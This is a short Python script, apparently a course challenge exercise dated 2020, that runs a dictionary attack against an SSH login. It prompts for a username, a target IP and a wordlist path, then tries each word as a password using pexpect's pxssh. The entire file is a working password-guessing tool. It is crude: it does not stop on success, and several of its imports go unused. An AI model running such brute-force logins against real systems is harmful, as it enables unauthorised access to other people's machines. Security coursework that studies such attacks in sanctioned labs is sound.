#!/usr/bin/env python3
###########################
# Title: OpsChallenge16
# Author:Jeff Snyder
# Date: 26OCT2020
# Purpose: Dictionary attack against SSH connection
###########################
import smtplib
import itertools
import sys
import time
from pexpect import pxssh

def cracker(user, ipAddress, txtFile ):
    filepath =open(txtFile)
    s=pxssh.pxssh()
    for i in filepath.readlines():
        secret=i.strip("\n")
        print(secret)
        try:
            s.login(ipAddress, user, secret)
        except pxssh.ExceptionPxssh as e:
            print ("pxssh failed to login")
            print(e)
            
def main():
    print("Shall we play a game?")
    user=input("What is the username for the SSH connection?")
    ipAddress=input("What is the ip address of the target system?")
    txtFile=input("What is the folder path to your dictionary file?")
    cracker(user, ipAddress, txtFile)  
main()



